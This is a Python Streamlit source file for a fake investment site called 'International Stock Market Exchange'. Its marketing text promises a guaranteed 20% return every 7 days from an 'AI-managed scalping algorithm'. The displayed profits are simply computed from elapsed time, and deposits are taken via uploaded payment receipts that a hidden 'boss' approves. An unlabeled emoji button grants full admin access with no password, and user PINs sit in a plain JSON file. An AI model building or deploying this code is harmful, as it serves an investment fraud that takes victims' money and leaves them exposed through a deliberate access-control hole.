import streamlit as st
import json
import os
import random
from datetime import datetime, timedelta
from streamlit_autorefresh import st_autorefresh

# ==========================================
# BLOCK 1: DATA STORAGE ENGINE
# ==========================================
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f: 
        json.dump(reg, f, indent=4, default=str)

# ==========================================
# BLOCK 2: PAGE CONFIG & NEW COLORFUL CSS
# ==========================================
st.set_page_config(page_title="ISMEX Official", layout="wide")

st.markdown("""
    <style>
    /* Global Background & Basic Text */
    .stApp { background-color: #0e1117; color: white; }
    p, label { color: #e0e0e0; font-family: 'Poppins', sans-serif; }
    
    /* NEW: COLORFUL BANNER (The ISMEX Title) */
    .rainbow-banner { 
        background-color: #1a1e26; border-radius: 10px; 
        padding: 25px 15px; text-align: center; margin-bottom: 20px;
        border: 1px solid #2d303a; box-shadow: 0 4px 15px rgba(0,255,136,0.1); 
    }
    .main-title { 
        font-family: 'Poppins', sans-serif; font-weight: bold; font-size: 28px; 
        background-image: linear-gradient(90deg, #ff007f, #ff4b4b, #ffaa00, #00ff88, #00eeff, #4d00ff);
        -webkit-background-clip: text; color: transparent; background-size: 300%;
        animation: rainbow-anim 4s linear infinite; margin: 0; 
    }
    
    /* NEW: ADVERTISEMENT PANEL Below Banner */
    .ad-panel { 
        background: #1c1e26; border-radius: 8px; border: 1px dashed #00eeff; 
        padding: 20px; margin-bottom: 25px; text-align: center;
    }
    .ad-title { 
        color: #00eeff; font-weight: bold; text-transform: uppercase; font-size: 14px; margin-bottom: 10px; 
    }
    .ad-text { color: #8c8f99; font-size: 13px; line-height: 1.5; margin: 0; }

    /* The Main Balance Card */
    .balance-card { 
        background: #1c1e26; padding: 25px; border-radius: 12px; 
        border: 1px solid #2d303a; text-align: center; margin-bottom: 25px; 
    }
    .balance-label { color: #8c8f99; font-size: 13px; letter-spacing: 1px; }
    .balance-val { color: #00ff88; font-size: 55px; font-weight: bold; margin: 0; font-family: 'Poppins', monospace; }
    
    /* The Horizontal Active Cycles Header */
    .section-header { 
        background: #1c1e26; padding: 10px; border-radius: 4px; 
        margin: 15px 0; font-weight: bold; border-left: 4px solid #ff4b4b; 
        color: white; font-size: 14px; 
    }
    
    /* The Cycle Cards (matching 8848.jpg) */
    .cycle-card {
        background-color: #1c1e26; padding: 20px; border-radius: 12px;
        border: 1px solid #2d303a; border-left: 4px solid #00ff88;
        margin-bottom: 15px;
    }
    .cap-row { color: white; font-size: 18px; font-weight: 500; }
    .roi-row-label { color: #00ff88; font-size: 12px; font-weight: bold; margin-top: 10px; }
    .roi-row-val { color: #00ff88; font-size: 45px; font-weight: bold; font-family: monospace; line-height: 1.1; }
    .rec-row-val { color: #8c8f99; font-size: 13px; margin: 5px 0 15px 0; }
    .time-row { color: #ff4b4b; font-weight: bold; font-size: 16px; margin-bottom: 12px; }
    .lock-banner {
        background-color: #252830; color: #8c8f99; padding: 12px;
        border-radius: 6px; font-size: 12px; text-align: center; border: 1px solid #3a3d46;
    }
    .p-symbol { color: #00ff88; font-weight: bold; }

    /* Login Box CSS for clean looks */
    div.stTextInput input { background-color: #1c1e26; border: 1px solid #2d303a; color: white; border-radius: 8px; }
    .stButton>button { width: 100%; border-radius: 8px; background-color: #1a1c22; color: white; font-weight: bold; border: 1px solid #2d303a; }
    .stButton>button:active { background-color: #00ff88; color: black; }

    /* Animation */
    @keyframes rainbow-anim { 0% { background-position: 0%; } 100% { background-position: 100%; } }
    </style>
    """, unsafe_allow_html=True)

# ==========================================
# BLOCK 3: SECRET AUTH & STEALTH ADMIN
# ==========================================
if 'user' not in st.session_state: st.session_state.user = None
if 'is_boss' not in st.session_state: st.session_state.is_boss = False

if st.session_state.user is None and not st.session_state.is_boss:
    # --- The Stealth Banner ---
    st.markdown("""
        <div class="rainbow-banner">
            <p class="main-title">INTERNATIONAL STOCK MARKET EXCHANGE</p>
        </div>
    """, unsafe_allow_html=True)
    
    # The Advertisement
    st.markdown("""
        <div class="ad-panel">
            <p class="ad-title">HOW WE GENERATE YOUR PROFIT:</p>
            <p class="ad-text">
                Your single capital is cycled multiple times every hour using our high-frequency 
                scalping algorithm to ensure steady, ticking growth.
            </p>
        </div>
    """, unsafe_allow_html=True)

    # Standard User Login
    ln = st.text_input("Username")
    lp = st.text_input("PIN", type="password")
    
    col_a, col_b = st.columns([0.9, 0.1])
    with col_a:
        if st.button("ENTER DASHBOARD"):
            reg = load_registry()
            if ln in reg and str(reg[ln].get('pin')) == str(lp):
                st.session_state.user = ln
                st.rerun()
            else:
                st.error("Invalid Username or PIN")
    
    with col_b:
        # THE SECRET BUTTON: Just the emoji, no text.
        if st.button("⛔"):
            st.session_state.is_boss = True
            st.rerun()
            
# ==========================================
# BLOCK 4: INVESTOR DASHBOARD
# ==========================================
if st.session_state.user:
    # 1. LIVE REFRESH EVERY 1 SECOND
    st_autorefresh(interval=1000, key="roi_ticker")
    
    name = st.session_state.user
    data = load_registry().get(name)
    now = datetime.now()
    ROI_PER_SEC = 0.20 / 604800 # 20% in 7 days (604800 seconds)

    # Header with colorful title and Advertisement
    st.markdown(f"Welcome, **{name}**")
    st.markdown("""
        <div class="rainbow-banner">
            <p class="main-title">INTERNATIONAL STOCK MARKET EXCHANGE</p>
        </div>
    """, unsafe_allow_html=True)
    
    # NEW: Your Investment Explanation Ad
    st.markdown("""
        <div class="ad-panel">
            <p class="ad-title">How We Generate Your Profit:</p>
            <p class="ad-text">
                Your single capital is diversified and **cycled multiple times** through our advanced AI-managed scalping algorithm every hour. 
                Instead of holding a stock for a year, we take small 0.05% profits from thousands of trades, combining them to provide you 
                with your precise, ticking 20% guaranteed profit over the 7-day cycle. Your money is always moving, never dormant!
            </p>
        </div>
    """, unsafe_allow_html=True)

    # Withdrawable Balance (styled)
    st.markdown(f"""
        <div class="balance-card">
            <p class="balance-label">WITHDRAWABLE BALANCE</p>
            <p class="balance-val"><span class="p-symbol">₱</span>{data['wallet']:,.2f}</p>
        </div>
    """, unsafe_allow_html=True)

    # Dashboard Actions (Deposit/Withdraw)
    c1, c2, c3 = st.columns([0.4, 0.4, 0.2])
    
    with c1:
        with st.expander("📥 DEPOSIT"):
            pending = [t for t in data.get('tx', []) if t['type']=="DEP" and t['status']=="PENDING"]
            if pending:
                st.warning("⏳ WAITING FOR APPROVAL")
                for p in pending: st.caption(f"Amount: ₱{p['amt']:,} | Sent: {p.get('date','Today')}")
            else:
                amt = st.number_input("Amount", min_value=1000, step=500, value=1000)
                file = st.file_uploader("Upload Receipt screenshot", type=['jpg','png','jpeg'])
                if file and st.button("SEND TO ADMIN"):
                    data.setdefault('tx', []).append({"type":"DEP","amt":amt,"status":"PENDING","date":now.strftime("%Y-%m-%d %I:%M %p")})
                    update_user(name, data); st.rerun()

    with c2:
        with st.expander("💸 WITHDRAW"):
            bal = float(data.get('wallet', 0.0))
            w_amt = st.number_input("Withdraw Amt", 0.0, max_value=max(0.0, bal), value=0.0)
            if st.button("CONFIRM") and w_amt > 0:
                data['wallet'] -= w_amt
                data.setdefault('tx', []).append({"type":"WITH","amt":w_amt,"status":"PENDING","date":now.strftime("%Y-%m-%d %I:%M %p")})
                update_user(name, data); st.rerun()
                
    with c3:
        if st.button("LOGOUT"):
            st.session_state.user = None
            st.rerun()

    # ==========================================
    # BLOCK 5: LIVE ACTIVE CYCLES
    # ==========================================
    st.markdown('<div class="section-header">⌛ ACTIVE CYCLES</div>', unsafe_allow_html=True)
    
    inv_list = data.get('inv', [])
    if not inv_list: st.info("No active investments. Deposit to start earning.")
    
    for idx, inv in enumerate(reversed(inv_list)):
        actual_idx = len(inv_list) - 1 - idx
        st_t = datetime.fromisoformat(inv['start'])
        et_t = datetime.fromisoformat(inv['end'])
        
        if now < et_t:
            # LIVE TICKING MATH
            elapsed = (now - st_t).total_seconds()
            current_roi = inv['amt'] * ROI_PER_SEC * elapsed
            diff = et_t - now
            time_str = f"{diff.days}D {diff.seconds//3600:02}H {(diff.seconds//60)%60:02}M {diff.seconds%60:02}S"
            banner_text = f"AVAILABLE TO PULL OUT FROM {et_t.strftime('%b %d, %I:%M %p')}"
            matured = False
        else:
            current_roi = inv['amt'] * 0.20
            time_str = "MATURED"
            banner_text = "✅ READY TO PULL OUT CAPITAL"
            matured = True
            if not inv.get('roi_paid', False):
                data['wallet'] += current_roi
                inv['roi_paid'] = True
                update_user(name, data)

        st.markdown(f"""
            <div class="cycle-card">
                <div class="cap-row">Capital: <span class="p-symbol">₱</span>{inv['amt']:,.1f}</div>
                <div class="roi-row-label">ACCUMULATED ROI:</div>
                <div class="roi-row-val"><span class="p-symbol">₱</span>{current_roi:,.4f}</div>
                <div class="rec-row-val">Total to Receive: ₱{inv['amt']*0.20:,.2f}</div>
                <div class="time-row">⌛ TIME REMAINING: {time_str}</div>
                <div class="lock-banner">{banner_text}</div>
            </div>
        """, unsafe_allow_html=True)
        
        if matured:
            if st.button(f"PULL OUT ₱{inv['amt']:,}", key=f"p_{actual_idx}"):
                data['wallet'] += inv['amt']
                data['inv'].pop(actual_idx)
                update_user(name, data); st.rerun()

# ==========================================
# BLOCK 6: BOSS ADMIN PANEL
# ==========================================
elif st.session_state.is_boss:
    st.title("ISMEX ADMIN")
    all_u = load_registry()
    for u_n, u_d in all_u.items():
        for tx in u_d.get('tx', []):
            if tx['status'] == "PENDING":
                st.info(f"USER: {u_n} | {tx['type']} | ₱{tx['amt']}")
                if st.button(f"APPROVE {u_n} ₱{tx['amt']} ##{random.randint(1,99)}"):
                    tx['status'] = "SUCCESSFUL"
                    if tx['type'] == "DEP":
                        u_d.setdefault('inv', []).append({"amt": tx['amt'], "start": datetime.now().isoformat(), "end": (datetime.now() + timedelta(days=7)).isoformat()})
                    update_user(u_n, u_d); st.rerun()
    if st.button("EXIT ADMIN"): st.session_state.is_boss = False; st.rerun()
        
